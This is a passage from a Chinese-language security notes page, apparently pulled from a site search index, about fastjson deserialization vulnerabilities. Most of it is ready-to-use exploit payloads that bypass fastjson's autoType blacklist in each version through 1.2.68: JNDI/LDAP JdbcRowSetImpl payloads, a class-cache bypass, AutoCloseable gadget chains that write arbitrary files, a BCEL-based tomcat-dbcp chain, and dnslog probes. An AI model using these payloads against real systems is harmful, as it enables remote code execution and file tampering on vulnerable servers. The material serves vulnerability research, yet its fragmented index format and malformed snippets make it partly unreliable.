7766605818834748097L , - 6835437086156813536L , - 4837536971810737970L , - 4082057040235125754L , - 2364987994247679115L , - 1872417015366588117L , - 254670111376247151L , - 190281065685395680L , 33238344207745342L , 313864100207897507L , 1203232727967308606L , 1502845958873959152L , 3547627781654598988L , 3730752432285826863L , 3794316665763266033L , 4147696707147271408L , 5347909877633654828L , 5450448828334921485L , 5751393439502795295L , 5944107969236155580L , 6742705432718011780L , 7179336928365889465L , 7442624256860549330L , 8838294710098435315L }; // ... if ((( - 3750763034362895579L ^ ( long ) className . charAt ( 0 )) * 1099511628211L ^ ( long ) className . charAt ( className . length () - 1 )) * 1099511628211L == 655701488918567152L ) { className = className . substring ( 1 , className . length () - 1 ); } 1.2.25-1.2.42 bypass # \u8fd9\u91cc\u7684\u5904\u7406\u53ea\u662f\u5904\u7406\u4e86\u4e00\u6b21\uff0c\u6240\u4ee5\u5b58\u5728\u7ecf\u5178\u7684\u53cc\u5199\u7ed5\u8fc7\uff0c\u5373\u53cc\u5199 L ; \u3002\u6240\u4ee5\u6211\u4eec\u6700\u7ec8\u7684\u7ed5\u8fc7payload\u4e3a: { \"@type\" : \"LLcom.sun.rowset.JdbcRowSetImpl;;\" , \"dataSourceName\" : \"ldap://127.0.0.1:1389/Basic/Command/calc.exe\" , \"autoCommit\" : true } 1.2.43 # \u8fd9\u4e2a\u7248\u672c\u7684fastjson\u5224\u65ad\u53ea\u8981\u4ee5LL\u5f00\u5934\u5c31\u76f4\u63a5\u629b\u51fa\u5f02\u5e38: if ((( - 3750763034362895579L ^ ( long ) className . charAt ( 0 )) * 1099511628211L ^ ( long ) className . charAt ( className . length () - 1 )) * 1099511628211L == 655701488918567152L ) { if ((( - 3750763034362895579L ^ ( long ) className . charAt ( 0 )) * 1099511628211L ^ ( long ) className . charAt ( 1 )) * 1099511628211L == 655656408941810501L ) { throw new JSONException ( \"autoType is not support. \" + typeName ); } 1.2.25-1.2.43 bypass # \u5b9e\u9645\u4e0a\u6211\u4eec\u4f9d\u7136\u80fd\u591f\u4f7f\u7528\u6570\u7ec4\u7684\u65b9\u5f0f(\u4ee5 [ \u5f00\u5934)\u8fdb\u884c\u7ed5\u8fc7\uff0c\u6240\u4ee5\u6211\u4eec\u4e0a\u9762\u7684\u7ed5\u8fc7payload\u4f9d\u7136\u53ef\u884c: { \"@type\" : \"[com.sun.rowset.JdbcRowSetImpl\" [{ \"dataSourceName\" : \"ldap://127.0.0.1:1389/Basic/Command/calc.exe\" , \"autoCommit\" : true }]} 1.2.44 # \u8fd9\u4e2a\u7248\u672c\u7684fastjson\u5224\u65ad\u53ea\u8981\u4ee5 [ \u5f00\u5934\u5c31\u629b\u51fa\u5f02\u5e38\uff0c\u4ee5 ; \u7ed3\u5c3e\u4e5f\u629b\u51fa\u5f02\u5e38\uff0c\u56e0\u6b64\u6211\u4eec\u4e0a\u8ff0\u7684\u7ed5\u8fc7\u65b9\u6cd5\u90fd\u5931\u6548\u4e86: long h1 = ( - 3750763034362895579L ^ ( long ) className . charAt ( 0 )) * 1099511628211L ; if ( h1 == - 5808493101479473382L ) { throw new JSONException ( \"autoType is not support. \" + typeName ); } else if (( h1 ^ ( long ) className . charAt ( className . length () - 1 )) * 1099511628211L == 655701488918567152L ) { throw new JSONException ( \"autoType is not support. \" + typeName ); } 1.2.25-1.2.44 bypass # \u8fd9\u4e2abypass\u4e3b\u8981\u662f\u7528\u5230\u7684\u4e00\u4e2a\u9ed1\u540d\u5355\u5916\u7684\u7c7b\uff0c\u5176\u662fmybatis\u5305\u91cc\u7684\u7c7b\uff0c\u6240\u4ee5\u9700\u8981\u6709mybatis\u7684\u4f9d\u8d56: { \"@type\" : \"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\" , \"properties\" : { \"data_source\" : \"ldap://127.0.0.1:23457/Command8\" } } 1.2.44-1.2.47 # \u589e\u52a0\u4e86\u9ed1\u540d\u5355\uff0c\u540c\u65f6\u622a\u6b62\u52301.2.47\u7248\u672c\uff0cfastjson\u5b58\u5728\u4e00\u4e2a\u5371\u5bb3\u6bd4\u8f83\u5927\u7684\u53cd\u5e8f\u5217\u5316\u7ed5\u8fc7\u65b9\u5f0f\uff0c\u5373\u4e0a\u9762\u63d0\u5230\u7684\u7f13\u5b58\u673a\u5236\u3002 <=1.2.47 bypass # \u6211\u4eec\u4e0a\u9762\u63d0\u5230\u5047\u5982fastjson\u4ece\u7f13\u5b58\u7684mapping\u4e2d\u627e\u5230\u7c7b\u540e\u4f1a\u76f4\u63a5\u8fd4\u56de\uff0c\u90a3\u4e48\u6709\u6ca1\u6709\u4e00\u79cd\u65b9\u5f0f\u53ef\u4ee5\u4f7f\u5f97\u4e00\u4e2a\u7c7b\u7f13\u5b58\u5462\uff1f\u6211\u4eec\u5148\u770b\u770b\u6700\u7ec8\u7684payload: { \"payload1\" : { \"@type\" : \"java.lang.Class\" , \"val\" : \"com.sun.rowset.JdbcRowSetImpl\" }, \"payload2\" : { \"@type\" : \"com.sun.rowset.JdbcRowSetImpl\" , \"dataSourceName\" : \"ldap://localhost:1389/Object\" , \"autoCommit\" : true } } \u53ef\u4ee5\u770b\u5230\u8fd9\u4e2apayload\u4e2d\u4f7f\u7528\u5230\u4e862\u6b21@type\uff0c\u5e76\u4e14\u5728\u7b2c\u4e00\u4e2a@type\u4e2d\u6307\u5b9a\u4e86\u7c7b\u578b\u4e3a java.lang.Class \u8fd9\u4e2a\u770b\u8d77\u6765\u6bd4\u8f83\u7279\u6b8a\u7684\u7c7b\uff0c\u5e76\u4e14\u5b58\u5728val\u5b57\u6bb5\u4e3a com.sun.rowset.JdbcRowSetImpl \uff0c\u7b2c\u4e8c\u6bb5\u4e2d\u5219\u662f\u6211\u4eec\u7684\u539f\u59cbpayload\u3002 \u6211\u4eec\u901a\u8fc7\u8c03\u8bd5\u6765\u7406\u89e3\u8fd9\u4e2apayload\uff0c\u5f53fastjson\u5728\u5904\u7406\u7b2c\u4e00\u4e2a@type\u65f6\uff0c\u4f1a\u5728 this.deserializers.findClass(typeName) \u627e\u5230Class\u8fd9\u4e2a\u7c7b\uff0c\u7136\u540e\u8fd9\u4e2a\u7c7b\u4f1a\u88ab\u8fd4\u56de\uff0c\u5728\u4e0a\u5c42\u7ecf\u8fc7\u4e00\u4e9b\u8d4b\u503c\uff0c\u6700\u7ec8\u4f1a\u4f7f\u7528MiscCodec\u8fd9\u4e2adeserializer\u6765\u5bf9\u8fd9\u4e2a\u7c7b\u8fdb\u884c\u89e3\u6790: \u8ddf\u8fdb\u8fd9\u4e2a\u65b9\u6cd5\uff0c\u8fd9\u91cc\u4e5f\u53ef\u4ee5\u770b\u5230\u5b83\u4f1a\u4eceval\u4e2d\u62ff\u5230\u503c\uff0c\u5e76\u8d4b\u503c\u7ed9objVal: \u540e\u9762\u53c8\u5c06objVal\u7684\u503c\u8d4b\u7ed9strVal: \u5224\u65adclazz\u7684\u7c7b\u578b\uff0c\u8fd9\u91cc\u662fClass.class\uff0c\u6700\u540e\u4f1a\u6839\u636estrVal\u91cc\u7684\u503c\u52a0\u8f7d\u7c7b: \u540c\u65f6\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u4f7f\u7528 TypeUtils.loadClass() \u65f6\u9ed8\u8ba4\u662f\u5c06\u7c7b\u7f13\u5b58\u7684\uff0c\u8fd9\u6837\u6211\u4eec\u5c31\u5c06\u6211\u4eec\u7684\u6076\u610f\u7c7b\u653e\u5165\u4e86\u7f13\u5b58\u3002 \u5230\u7b2c\u4e8c\u4e2a@type\u65f6\uff0c\u7531\u4e8e\u7f13\u5b58\u5df2\u7ecf\u5b58\u5728\u8fd9\u4e2a\u6076\u610f\u7c7b\uff0c\u6240\u4ee5\u4f1a\u76f4\u63a5\u8fd4\u56de\uff0c\u800c\u4e0d\u4f1a\u8d70\u9ed1\u540d\u5355\uff0c\u6240\u4ee5\u6211\u4eec\u7684payload\u5c31\u80fd\u591f\u7ed5\u8fc7\u4e4b\u524d\u7684\u5b89\u5168\u673a\u5236\u3002 \u8fd9\u91cc\u6709\u4e00\u4e9b\u6ce8\u610f\u4e8b\u9879\uff0c\u7531\u4e8e\u4e0d\u540c\u7248\u672c\u7684 ParserConfig.checkAutoType() \u89e3\u6790\u5b58\u5728\u5dee\u5f02\uff0c\u56e0\u6b64: - 1.2.25-1.2.32\uff1a\u672a\u5f00\u542fAutoTypeSupport\u65f6\u80fd\u6210\u529f\u5229\u7528\uff0c\u5f00\u542fAutoTypeSupport\u53cd\u800c\u4e0d\u80fd\u6210\u529f\u89e6\u53d1 - 1.2.33-1.2.47\uff1a\u65e0\u8bba\u662f\u5426\u5f00\u542fAutoTypeSupport\uff0c\u90fd\u80fd\u6210\u529f\u5229\u7528 \u8fd9\u91cc\u5b58\u5728\u7684\u5dee\u5f02\u4e3b\u8981\u662f\u7531\u4e8e\u57281.2.33-1.2.47\u4e2d\u9ed1\u540d\u5355\u4f1a\u5224\u65ad\u7c7b\u662f\u5426\u5df2\u7ecf\u5728\u7f13\u5b58\u4e2d\uff0c\u5982\u679c\u5df2\u7ecf\u5728\u7f13\u5b58\u91cc\u5219\u4e0d\u4f1a\u8fdb\u884c\u62e6\u622a: \u800c\u5728\u65e7\u7248\u672c\u4e2d\u5219\u4e0d\u5b58\u5728\u8fd9\u4e2a\u5224\u65ad\uff0c\u56e0\u6b64\u57281.2.25-1.2.32\u65f6\uff0c\u5982\u679c\u5f00\u542f\u4e86autotypesupport\uff0c\u5219\u4f1a\u76f4\u63a5\u88ab\u9ed1\u540d\u5355\u62e6\u622a\u3002 1.2.48-1.2.67 # \u8fd9\u7248\u672c\u7684fastjson\u4e3b\u8981\u662f\u7ee7\u7eed\u6dfb\u52a0\u9ed1\u540d\u5355\uff0c\u540c\u65f6 TypeUtils.loadClass() \u65b9\u6cd5\u9ed8\u8ba4\u4e0d\u542f\u7528\u7f13\u5b58: <=1.2.67 expectclass bypass # \u4e0a\u9762\u7684\u7ed5\u8fc7\u65b9\u5f0f\u90fd\u884c\u4e0d\u901a\u4e86\uff0c\u6211\u4eec\u8fd8\u6709\u4ec0\u4e48\u65b9\u6cd5\u53ef\u4ee5\u52a0\u8f7d\u6076\u610f\u7c7b\u5417\uff1f\u5b9e\u9645\u4e0a\u5728 TypeUtils.checkAutoType() \u8fd8\u5b58\u5728\u7740\u4e00\u4e2a\u52a0\u8f7d\u7c7b\u7684\u8bed\u53e5: \u8fd9\u91cc\u7684\u6761\u4ef6 autotypesupport || jsonType || expectClassFlag \uff0c\u8fd9\u91ccautotypesupport\u4e0d\u7ba1\u5f00\u5173\u90fd\u5f71\u54cd\u4e0d\u5927\uff0c\u56e0\u4e3a\u6211\u4eec\u6ca1\u529e\u6cd5\u7ed5\u8fc7\u524d\u9762\u7684\u9ed1\u540d\u5355\u68c0\u6d4b\uff0c\u6211\u4eec\u91cd\u70b9\u5173\u6ce8 expectClassFlag \u8fd9\u4e2a\u9009\u9879\uff0c\u5176\u5728\u8fd9\u91cc\u88ab\u8d4b\u503c: \u8fd9\u91cc\u9700\u8981\u6ee1\u8db3\u4ee5\u4e0b\u51e0\u4e2a\u6761\u4ef6 expectClassFlag \u624d\u4e3atrue: 1. expectClass\u5b58\u5728 2. expectClass\u4e0d\u5728\u9ed1\u540d\u5355\u91cc \u6211\u4eec\u53ef\u4ee5\u770b\u5230expectClass\u662f\u8c03\u7528\u8be5\u51fd\u6570\u65f6\u4f20\u5165\u7684\uff0c\u5728\u6574\u4e2afastjson\u4e2d\u5bfb\u627echeckAutoType\u7684\u8c03\u7528\u4e14expectClass\u4e0d\u4e3a\u7a7a\u7684\uff0c\u5728 JavaBeanDeserializer.deserialize() \u65b9\u6cd5\u4e2d\u627e\u5230\u6211\u4eec\u7684\u76ee\u6807: \u8fd9\u91cc\u7684\u5206\u6790\u7531\u4e8e\u6709\u70b9\u590d\u6742\uff0c\u53c2\u8003\u4e86\u5176\u4ed6\u5e08\u5085\u7684\u6587\u7ae0\uff0c\u60f3\u8981\u8fdb\u5165\u5230\u8fd9\u4e2a\u4f4d\u7f6e\uff0c\u9700\u8981\u4e24\u4e2a@type\uff0c\u7b2c\u4e8c\u4e2a\u9700\u8981\u5b9e\u73b0 AutoCloseable \u63a5\u53e3\uff0c\u4e5f\u5c31\u662f\u6700\u7ec8payload\u7c7b\u4f3c\u4e8e: 1. ` { \"@type\" : \"java.lang.AutoCloseable\" , \"@type\" : \"com.example.json.evil.Evil\" , \"cmd\" : \"calc\" } ` \u8fd9\u6837\u6211\u4eec\u5c31\u80fd\u591f\u53cd\u5e8f\u5217\u5316\u5b9e\u73b0\u4e86AutoCloseable\u7684\u7c7b\uff0c\u5229\u7528\u8fd9\u4e2a\u7ed5\u8fc7\u53bb\u5b9e\u73b0\u653b\u51fb\u9700\u8981\u5bfb\u627e\u5230\u5408\u9002\u7684\u5b9e\u73b0\u4e86AutoCloseable\u7684\u7c7b\u5e76\u5c06\u4ed6\u4eec\u7ec4\u5408\u8d77\u6765\uff0c\u4e00\u4e9b\u53ef\u7528\u7684payload\u5982\u4e0b: \u7b2c\u4e00\u4e2a: { \"stream\" : { \"@type\" : \"java.lang.AutoCloseable\" , \"@type\" : \"org.eclipse.core.internal.localstore.SafeFileOutputStream\" , \"targetPath\" : \"./hacked.txt\" , \\\\\u521b\u5efa\u4e00\u4e2a\u7a7a\u6587\u4ef6 \"tempPath\" : \"./test.txt\" \\\\\u521b\u5efa\u4e00\u4e2a\u6709\u5185\u5bb9\u7684\u6587\u4ef6 }, \"writer\" : { \"@type\" : \"java.lang.AutoCloseable\" , \"@type\" : \"com.esotericsoftware.kryo.io.Output\" , \"buffer\" : \"cHdu\" , \\\\base 64 \u540e\u7684\u6587\u4ef6\u5185\u5bb9 \"outputStream\" : { \"$ref\" : \"$.stream\" }, \"position\" : 5 }, \"close\" : { \"@type\" : \"java.lang.AutoCloseable\" , \"@type\" : \"com.sleepycat.bind.serial.SerialOutput\" , \"out\" : { \"$ref\" : \"$.writer\" } } } \u4e0a\u8ff0payload\u9700\u8981\u76ee\u6807\u73af\u5883\u5b58\u5728\u4ee5\u4e0b\u7684\u4f9d\u8d56: <dependency> <groupId> com.sleepycat </groupId> <artifactId> je </artifactId> <version> 5.0.73 </version> </dependency> <dependency> <groupId> com.esotericsoftware </groupId> <artifactId> kryo </artifactId> <version> 4.0.0 </version> </dependency> <dependency> <groupId> org.aspectj </groupId> <artifactId> aspectjtools </artifactId> <version> 1.9.5 </version> </dependency> \u7b2c\u4e8c\u4e2a: { \"@type\" : \"java.lang.AutoCloseable\" , \"@type\" : \"sun.rmi.server.MarshalOutputStream\" , \"out\" : { \"@type\" : \"java.util.zip.InflaterOutputStream\" , \"out\" : { \"@type\" : \"java.io.FileOutputStream\" , \"file\" : \"/tmp/asdasd\" , \"append\" : true }, \"infl\" : { \"input\" : { \"array\" : \"eJxLLE5JTCkGAAh5AnE=\" , \"limit\" : 14 } }, \"bufLen\" : \"100\" }, \"protocolVersion\" : 1 } \u4e0a\u8ff0\u7684payload\u9700\u8981java\u4fdd\u7559\u4e86LocalVariableTable\uff0c\u53c2\u8003\u5176\u4ed6\u5e08\u5085\u7684\u539f\u8bdd: \u800c\u6211\u5728\u591a\u4e2a\u4e0d\u540c\u7684\u64cd\u4f5c\u7cfb\u7edf\u4e0b\u7684 OpenJDK\u3001Oracle JDK \u8fdb\u884c\u6d4b\u8bd5\uff0c\u76ee\u524d\u53ea\u53d1\u73b0 CentOS \u4e0b\u7684 OpenJDK 8 \u5b57\u8282\u7801\u8c03\u8bd5\u4fe1\u606f\u4e2d\u542b\u6709 LocalVariableTable\uff08\u6839\u636e\u6c88\u6c89\u821f\u7684\u6587\u7ae0\uff0cRedHat \u4e0b\u7684 JDK8 \u5b89\u88c5\u5305\u4e5f\u4f1a\u6709\uff0c\u4e0d\u8fc7\u4ed6\u5e76\u672a\u8bf4\u660e\u662f OpenJDK \u8fd8\u662f Oracle JDK\uff0c\u6211\u672a\u505a\u6d4b\u8bd5\uff09\u3002 \u7b2c\u4e09\u4e2a(\u9700\u8981commons-io 2.x\u7248\u672c): commons-io 2.0 - 2.6 \u7248\u672c: { \"x\" :{ \"@type\" : \"com.alibaba.fastjson.JSONObject\" , \"input\" :{ \"@type\" : \"java.lang.AutoCloseable\" , \"@type\" : \"org.apache.commons.io.input.ReaderInputStream\" , \"reader\" :{ \"@type\" : \"org.apache.commons.io.input.CharSequenceReader\" , \"charSequence\" :{ \"@type\" : \"java.lang.String\"\"aaaaaa...(\u957f\u5ea6\u8981\u5927\u4e8e8192\uff0c\u5b9e\u9645\u5199\u5165\u524d8192\u4e2a\u5b57\u7b26)\" }, \"charsetName\" : \"UTF-8\" , \"bufferSize\" : 1024 }, \"branch\" :{ \"@type\" : \"java.lang.AutoCloseable\" , \"@type\" : \"org.apache.commons.io.output.WriterOutputStream\" , \"writer\" :{ \"@type\" : \"org.apache.commons.io.output.FileWriterWithEncoding\" , \"file\" : \"/tmp/pwned\" , \"encoding\" : \"UTF-8\" , \"append\" : false }, \"charsetName\" : \"UTF-8\" , \"bufferSize\" : 1024 , \"writeImmediately\" : true }, \"trigger\" :{ \"@type\" : \"java.lang.AutoCloseable\" , \"@type\" : \"org.apache.commons.io.input.XmlStreamReader\" , \"is\" :{ \"@type\" : \"org.apache.commons.io.input.TeeInputStream\" , \"input\" :{ \"$ref\" : \"$.input\" }, \"branch\" :{ \"$ref\" : \"$.branch\" }, \"closeBranch\" : true }, \"httpContentType\" : \"text/xml\" , \"lenient\" : false , \"defaultEncoding\" : \"UTF-8\" }, \"trigger2\" :{ \"@type\" : \"java.lang.AutoCloseable\" , \"@type\" : \"org.apache.commons.io.input.XmlStreamReader\" , \"is\" :{ \"@type\" : \"org.apache.commons.io.input.TeeInputStream\" , \"input\" :{ \"$ref\" : \"$.input\" }, \"branch\" :{ \"$ref\" : \"$.branch\" }, \"closeBranch\" : true }, \"httpContentType\" : \"text/xml\" , \"lenient\" : false , \"defaultEncoding\" : \"UTF-8\" }, \"trigger3\" :{ \"@type\" : \"java.lang.AutoCloseable\" , \"@type\" : \"org.apache.commons.io.input.XmlStreamReader\" , \"is\" :{ \"@type\" : \"org.apache.commons.io.input.TeeInputStream\" , \"input\" :{ \"$ref\" : \"$.input\" }, \"branch\" :{ \"$ref\" : \"$.branch\" }, \"closeBranch\" : true }, \"httpContentType\" : \"text/xml\" , \"lenient\" : false , \"defaultEncoding\" : \"UTF-8\" } } } commons-io 2.7 - 2.8.0 \u7248\u672c: { \"x\" :{ \"@type\" : \"com.alibaba.fastjson.JSONObject\" , \"input\" :{ \"@type\" : \"java.lang.AutoCloseable\" , \"@type\" : \"org.apache.commons.io.input.ReaderInputStream\" , \"reader\" :{ \"@type\" : \"org.apache.commons.io.input.CharSequenceReader\" , \"charSequence\" :{ \"@type\" : \"java.lang.String\"\"aaaaaa...(\u957f\u5ea6\u8981\u5927\u4e8e8192\uff0c\u5b9e\u9645\u5199\u5165\u524d8192\u4e2a\u5b57\u7b26)\" , \"start\" : 0 , \"end\" : 2147483647 }, \"charsetName\" : \"UTF-8\" , \"bufferSize\" : 1024 }, \"branch\" :{ \"@type\" : \"java.lang.AutoCloseable\" , \"@type\" : \"org.apache.commons.io.output.WriterOutputStream\" , \"writer\" :{ \"@type\" : \"org.apache.commons.io.output.FileWriterWithEncoding\" , \"file\" : \"/tmp/pwned\" , \"charsetName\" : \"UTF-8\" , \"append\" : false }, \"charsetName\" : \"UTF-8\" , \"bufferSize\" : 1024 , \"writeImmediately\" : true }, \"trigger\" :{ \"@type\" : \"java.lang.AutoCloseable\" , \"@type\" : \"org.apache.commons.io.input.XmlStreamReader\" , \"inputStream\" :{ \"@type\" : \"org.apache.commons.io.input.TeeInputStream\" , \"input\" :{ \"$ref\" : \"$.input\" }, \"branch\" :{ \"$ref\" : \"$.branch\" }, \"closeBranch\" : true }, \"httpContentType\" : \"text/xml\" , \"lenient\" : false , \"defaultEncoding\" : \"UTF-8\" }, \"trigger2\" :{ \"@type\" : \"java.lang.AutoCloseable\" , \"@type\" : \"org.apache.commons.io.input.XmlStreamReader\" , \"inputStream\" :{ \"@type\" : \"org.apache.commons.io.input.TeeInputStream\" , \"input\" :{ \"$ref\" : \"$.input\" }, \"branch\" :{ \"$ref\" : \"$.branch\" }, \"closeBranch\" : true }, \"httpContentType\" : \"text/xml\" , \"lenient\" : false , \"defaultEncoding\" : \"UTF-8\" }, \"trigger3\" :{ \"@type\" : \"java.lang.AutoCloseable\" , \"@type\" : \"org.apache.commons.io.input.XmlStreamReader\" , \"inputStream\" :{ \"@type\" : \"org.apache.commons.io.input.TeeInputStream\" , \"input\" :{ \"$ref\" : \"$.input\" }, \"branch\" :{ \"$ref\" : \"$.branch\" }, \"closeBranch\" : true }, \"httpContentType\" : \"text/xml\" , \"lenient\" : false , \"defaultEncoding\" : \"UTF-8\" } } \u7b2c\u56db\u4e2a(\u9700\u8981tomcat-dbcp\u4f9d\u8d56\uff0c\u662ftomcat\u7684\u6570\u636e\u5e93\u9a71\u52a8\u4f9d\u8d56): { { \"@type\" : \"com.alibaba.fastjson.JSONObject\" , \"x\" :{ \"@type\" : \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\" , \"driverClassLoader\" : { \"@type\" : \"com.sun.org.apache.bcel.internal.util.ClassLoader\" }, \"driverClassName\" : \"$$BCEL$$$l$8b$I$A$...\" } }: \"x\" } \u8be6\u60c5\u5206\u6790\u53c2\u8003 \u8fd9\u91cc \u66f4\u591a\u7684\u5229\u7528\u94fe\u5728 Blackhat 2021 \u8bae\u9898\u8be6\u7ec6\u5206\u6790\u2014\u2014 FastJson \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u53ca\u5728\u533a\u5757\u94fe\u5e94\u7528\u4e2d\u7684\u6e17\u900f\u5229\u7528 1.2.68 # \u6dfb\u52a0\u4e86safeMode\u8fd9\u4e2a\u5b89\u5168\u5f00\u5173\uff0c\u5f00\u542f\u540e\u4e0d\u518d\u6709autotype\uff0c@type\u952e\u65e0\u6548\uff0c\u4f46\u662f\u8fd9\u4e2a\u5f00\u5173\u9ed8\u8ba4\u662f\u5173\u95ed\u7684\uff0c\u4f9d\u7136\u53ef\u4ee5\u4f7f\u7528\u4e0a\u8ff0\u7684expectclass bypass\u3002 \u68c0\u6d4bfastjson # dnslog # { \"@type\" : \"java.net.InetAddress\" , \"val\" : \"dnslog\" } \u5728 49 \u4ee5\u4e0b\u624d\u80fd\u89e6\u53d1 { \"@type\" : \"java.net.Inet4Address\" , \"val\" : \"dnslog\" } { \"@type\" : \"java.net.Inet6Address\" , \"val\" : \"dnslog\" } { \"@type\" : \"java.net.InetSocketAddress\" { \"address\" :, \"val\" : \"dnslog\" }} { \"@type\" : \"com.alibaba.fastjson.JSONObject\" , { \"@type\" : \"java.net.URL\" , \"val\" : \"http://dnslog\" }} \"\" } {{ \"@type\" : \"java.net.URL\" , \"val\" : \"http://dnslog\" }: \"aaa\" } Se t [{ \"@type\" : \"java.net.URL\" , \"val\" : \"http://dnslog\" }] Se t [{ \"@type\" : \"java.net.URL\" , \"val\" : \"http://dnslog\" } \u68c0\u6d4b\u7248\u672c # \u53c2\u8003\u4e86 \u8fd9\u7bc7\u6587\u7ae0 \uff0c\u9700\u8981\u5728\u54cd\u5e94\u4e2d\u8f93\u51fa\u5f02\u5e38\u624d\u80fd\u7528\u3002 1.\u5f53\u4ee3\u7801\u4f7f\u7528 JSON.parseObject(json , clazz) \u6307\u5b9a\u671f\u671b\u7c7b\u7684\u65b9\u5f0f\u53bb\u89e3\u6790 JSON\uff0c\u4e14 clazz \u4e0d\u80fd\u4e3a fastjson \u5df2\u8bbe\u5b9a\u7684\u5927\u90e8\u5206\u7c7b\u578b\uff0c\u5982\u201cHashmap\u201d\u3001\u201cArrayList\u201d\u3002 2.\u5f53\u4f7f\u7528 JSON.parse(json) \u4e0d\u6307\u5b9a\u671f\u671b\u7c7b\u7684\u65f6\u5019\u53ef\u4ee5\u901a\u8fc7 AutoCloseable \u6765\u89e6\u53d1 \u6240\u4ee5\u53ef\u7528\u7684payload\u4e3a: \u7b2c\u4e00\u79cd: a \u7b2c\u4e8c\u79cd: { \"@type\" : \"java.lang.AutoCloseable\" \u5176\u4ed6\u6ce8\u610f\u4e8b\u9879 #","title":"fastjson"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/fastjson/#fastjson","text":"\u4ee5\u4e0b\u4ee3\u7801\u6765\u6e90\u4e8efastjson1.2.25 fastjson\u53cd\u5e8f\u5217\u5316\u672c\u8d28\u4e0a\u5c31\u662f\u901a\u8fc7\u5728\u53cd\u5e8f\u5217\u5316\u65f6\u81ea\u52a8\u8c03\u7528getter\u548csetter\u65b9\u6cd5\uff0c\u800c\u67d0\u4e9b\u7c7b\u7684getter\u548csetter\u65b9\u6cd5\u5b58\u5728\u67d0\u4e9b\u5371\u9669\u903b\u8f91(\u5982\u6211\u4eec\u7684\u8001\u670b\u53cb TemplatesImpl )\uff0c\u4ece\u800c\u8fbe\u5230\u6211\u4eec\u7684\u76ee\u7684(\u5982RCE)\u3002","title":"fastjson"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/fastjson/#fastjson\u4f7f\u7528","text":"fastjson\u4e2d\u5e38\u7528\u5230\u7684\u53cd\u5e8f\u5217\u5316\u7684\u65b9\u6cd5\u4e00\u5171\u6709\u4e09\u4e2a: - JSON.parse(String) - JSON.parseObject(String) - JSON.parseObject(String, clazz) \u8fd9\u4e09\u4e2a\u65b9\u6cd5\u5b58\u5728\u7740\u4e00\u4e9b\u5dee\u5f02\uff0c\u53ef\u4ee5\u770b\u540e\u7eed\u7684\u7b80\u7565\u5206\u6790\u3002\u8be6\u60c5\u53ef\u4ee5\u89c1 \u8fd9\u91cc \u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\u5982\u4e0b: import java.util.Properties ; public class User { public Integer id ; public String name ; private Properties t1 ; public User () { System . out . println ( \"call default constructor\" ); } public String getName () { System . out . println ( \"call get name\" ); return name ; } public void setName ( String name ) { System . out . println ( \"call set name\" ); this . name = name ; } public Integer getId () { System . out . println ( \"call get id\" ); return id ; } public Properties getT1 () { System . out . println ( \"call get t1\" ); return t1 ; } public void setId ( Integer id ) { System . out . println ( \"call set id\" ); this . id = id ; } public User ( Integer id , String name , Properties t1 ) { System . out . println ( \"call constructor\" ); this . id = id ; this . name = name ; this . t1 = t1 ; } @Override public String toString () { return \"User{\" + \"id=\" + id + \", name='\" + name + '\\'' + \", t1=\" + t1 + '}' ; } } import com.alibaba.fastjson.JSON ; import com.alibaba.fastjson.parser.Feature ; import com.alibaba.fastjson.parser.ParserConfig ; public class Main { public static void main ( String [] args ) { User u = new User ( 5 , \"tom\" , new Properties ()); System . out . println ( \"-------toJSONString()------\" ); System . out . println ( JSON . toJSONString ( u )); System . out . println ( \"-------parse(str)------\" ); ParserConfig . getGlobalInstance (). setAutoTypeSupport ( true ); String s = \"{\\\"@type\\\":\\\"User\\\", \\\"id\\\": 123, \\\"name\\\":\\\"Tom\\\", \\\"t1\\\":{}}\" ; System . out . println ( JSON . parse ( s )); System . out . println ( \"-------parseObject(str)------\" ); System . out . println ( JSON . parseObject ( s )); System . out . println ( \"-------parseObject(str, User.class)------\" ); System . out . println ( JSON . parseObject ( s , User . class )); } } \u6700\u540e\u8f93\u51fa\u5982\u4e0b: call constructor -------toJSONString()------ call get id call get name call get t1 {\"id\":5,\"name\":\"tom\",\"t1\":{}} -------parse(str)------ call default constructor call set id call set name call get t1 User{id=123, name='Tom', t1=null} -------parseObject(str)------ call default constructor call set id call set name call get t1 call get id call get name call get t1 {\"name\":\"Tom\",\"id\":123} -------parseObject(str, User.class)------ call default constructor call set id call set name call get t1 User{id=123, name='Tom', t1=null} \u901a\u8fc7\u4e0a\u9762\u7684\u8f93\u51fa\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0fastjson\u5728\u5e8f\u5217\u5316\u7684\u65f6\u5019\u4f1a\u8c03\u7528getter\u65b9\u6cd5\uff0c\u800c\u5728\u53cd\u5e8f\u5217\u5316\u65f6\u4f1a\u4f18\u5148\u8c03\u7528\u7c7b\u7684\u65e0\u53c2\u9ed8\u8ba4\u6784\u9020\u65b9\u6cd5\uff0c\u7136\u540e\u901a\u8fc7setter\u7684\u65b9\u5f0f\u53bb\u8fd8\u539f\u6211\u4eec\u7684\u5bf9\u8c61\u3002 \u6211\u4eec\u53ef\u4ee5\u770b\u5230 parse(str) \u548c parseObject(str, User.class) \u7684\u8f93\u51fa\u662f\u4e00\u6837\u7684\uff0c\u800c parseObject(str) \u7684\u7ed3\u679c\u5374\u4e0d\u592a\u4e00\u6837\u3002 \u8fd9\u91cc\u8fd8\u6709\u4e00\u4e9b\u6bd4\u8f83\u6709\u8da3\u7684\u5730\u65b9: 1. \u4e3a\u4ec0\u4e48 parseObject(str) \u548c\u53e6\u5916\u4e24\u4e2a\u53cd\u5e8f\u5217\u5316\u7684\u884c\u4e3a\u4e0d\u4e00\u6837\uff1f(\u628a\u6240\u6709\u7684getter\u65b9\u6cd5\u8c03\u7528\u4e86\u4e00\u904d) 2. \u4e3a\u4ec0\u4e48\u53cd\u5e8f\u5217\u5316\u65f6\u4f1a\u8c03\u7528 getT1() \uff0c\u800c\u4e0d\u4f1a\u8c03\u7528\u5176\u4ed6\u7684getter\u65b9\u6cd5\uff1f ### \u7b2c\u4e00\u4e2a\u95ee\u9898 \u4e3a\u4ec0\u4e48 parseObject(str) 